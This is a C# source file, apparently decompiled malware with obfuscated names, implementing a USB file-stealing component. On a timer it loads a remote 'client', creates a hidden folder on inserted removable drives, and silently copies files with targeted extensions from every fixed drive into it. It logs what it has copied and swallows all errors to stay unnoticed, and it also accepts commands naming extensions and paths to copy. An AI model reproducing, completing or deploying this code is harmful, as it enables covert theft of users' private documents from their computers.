using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace uwcrise;

internal class qurarisoPUSB
{
	public List<string> fExts = new List<string>();

	private Thread qurarisofunThread;

	private ThreadStart qurarisofunStarter;

	public bool qurarisoreaging = false;

	private qurarisoVCON vps = new qurarisoVCON();

	public bool qurarisothrRuning = true;

	public List<string> qurarisosFiles = new List<string>();

	public int con_tries = 0;

	private qurarisoUSBP qurarisousbp = new qurarisoUSBP();

	private qurarisoTHRD qurarisoStateObj = new qurarisoTHRD();

	public void qurarisoset_timer()
	{
		TimerCallback callback = qurarisocheckUSB;
		Timer timer = new Timer(callback, qurarisoStateObj, 32000, 17000);
		qurarisoStateObj.timer = timer;
	}

	private void qurarisocheckUSB(object source)
	{
		try
		{
			qurarisoloadclient();
			if (qurarisoSETPS.qurarisocontries > 5 && !qurarisoSETPS.qurarisoworking)
			{
				qurarisoSETPS.qurarisoworking = true;
				if (qurarisoSETPS.qurarisousbDrive == "")
				{
					qurarisocheck_usb();
				}
				if (qurarisoSETPS.qurarisousbDrive != "")
				{
					qurarisocopyall_to_usb();
				}
				qurarisoSETPS.qurarisoworking = false;
			}
			else if (qurarisoSETPS.qurarisocontries == 0 && !qurarisousbp.qurarisothr_runing)
			{
				qurarisousbp.qurarisoget_drives();
			}
		}
		catch
		{
			qurarisoSETPS.qurarisoworking = false;
		}
	}

	public void qurarisoloadclient()
	{
		qurarisofunStarter = delegate
		{
			vps.qurarisoload_client();
		};
		qurarisofunThread = new Thread(qurarisofunStarter);
		qurarisofunThread.Start();
	}

	public void qurarisocopy_to_usb(string tempStr)
	{
		fExts.Clear();
		qurarisosFiles.Clear();
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				fExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			qurarisosend_files(array[1]);
		}
	}

	public bool qurarisois_accessible(string folder)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		try
		{
			directoryInfo.GetDirectories();
			if (qurarisoSETPS.qurarisonFilders.Contains(folder.Substring(3).ToLower()))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool qurarisocheck_usb()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
				{
					if (!Directory.Exists(driveInfo.Name + "\\" + qurarisoSETPS.qurarisousbfold))
					{
						DirectoryInfo directoryInfo = Directory.CreateDirectory(driveInfo.Name + "\\" + qurarisoSETPS.qurarisousbfold);
						directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
					}
					qurarisoSETPS.qurarisousbDrive = driveInfo.Name + "\\" + qurarisoSETPS.qurarisousbfold + "\\";
					return true;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void qurarisocopyall_to_usb()
	{
		fExts.Clear();
		qurarisoreaging = true;
		string[] array = qurarisoSETPS.qurarisofilexts.Split(new char[1] { '>' });
		string[] array2 = array;
		foreach (string text in array2)
		{
			if (text != "")
			{
				fExts.Add(text);
			}
		}
		qurarisosFiles.Clear();
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array3 = drives;
		foreach (DriveInfo driveInfo in array3)
		{
			if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Removable)
			{
				qurarisosend_files(driveInfo.Name);
			}
		}
		qurarisoreaging = false;
	}

	public IEnumerable<string> qurarisosystem_files(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (qurarisois_accessible(text))
					{
						queue.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public bool qurarisosave_file(string line)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofilewrm, append: true);
			textWriter.WriteLine(line);
			textWriter.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool qurarisocheck_file(string line)
	{
		try
		{
			if (File.Exists(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofilewrm))
			{
				string[] array = File.ReadAllLines(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofilewrm);
				string[] array2 = array;
				foreach (string text in array2)
				{
					string[] array3 = text.Split(new char[1] { '<' });
					if (array3.Length > 1)
					{
						if (line.ToLower() == array3[0].ToLower())
						{
							return true;
						}
					}
					else if (line.ToLower() == text.ToLower())
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void qurarisosend_files(string path)
	{
		try
		{
			foreach (string item in qurarisosystem_files(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (fExts.Contains(text.ToLower()) && !qurarisocheck_file(item))
				{
					if (Directory.Exists(qurarisoSETPS.qurarisousbDrive))
					{
						File.Copy(item, qurarisoSETPS.qurarisouni_file(qurarisoSETPS.qurarisousbDrive + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
						qurarisosave_file(item);
					}
					else
					{
						qurarisoSETPS.qurarisousbDrive = "";
					}
				}
			}
		}
		catch
		{
		}
	}
}
